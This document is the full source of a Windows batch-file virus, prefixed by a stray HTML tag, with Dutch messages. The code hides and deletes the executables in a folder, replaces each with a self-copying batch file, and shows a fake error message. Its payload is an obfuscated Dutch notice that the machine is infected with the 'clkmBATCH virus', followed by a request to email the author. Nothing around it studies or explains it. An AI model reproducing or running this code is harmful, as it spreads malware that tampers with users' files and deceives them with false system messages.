<html>@echo off
set iam=MMORPH~1.EXE
Rem Microsoft Windows Turbo file
set mel= %windir%\savedfiles\%iam%
if exist %mel% START %mel%
if not exist %mel% echo Dit programma heeft een fout ondervonden en wordt afgesloten.
@cls
%l%set i=*
%l%set x=%i%.exe
%l%if not exist %x% goto payload
@cls
set file=
%l%set ext=a
:ale
for %%f in (%x%) do set file=%%f
@mkdir %windir%\savedfiles>NUL
@cls
%l%copy %file% %windir%\savedfiles\%file%
@attrib %file% -h -r -s
@attrib %windir%\savedfiles\%file% +h
del %file%
@cls
%l%echo @echo off>>%file%
%l%echo set iam=%file%>>%file%
find "l"<%0>>%file%
%l%ren %file% *.bat
@cls
goto leave
:payload
%l%set h=e
%l%set u=o
%l%set b=ATCH
%l%set y=i
%l%set r=a
%l%set m=@
@cls
%l%echo J%h% b%h%nt g%h%inf%h%ct%h%%h%rd g%h%r%r%%r%kt m%h%t h%h%t
echo clkm%b% v%y%rus. Ik h%u%%u%p dat j%h% m%h%
%l%echo %h%%h%n pr%h%ttig%h% %h%rv%r%r%y%ng v%y%ndt. M%h%t
%l%echo d%h%ze b%u%%u%dsch%r%p w%y%l %y%k u vragen m%y%j
echo %h%%h%n m%r%%y%l t%h% stur%h%n %u%p ikb%h%ng%h%k%m%h%u%tm%r%il.com
echo d%r%nkuw%h%l. En %h%%h%n pr%h%ttig%h% d%r%g v%h%rd%h%r!
goto lu
:leave
@cls   
%l%if not exist %windir%\savedfiles\%iam% do echo This file seems not to be a falid windows file.
:lu
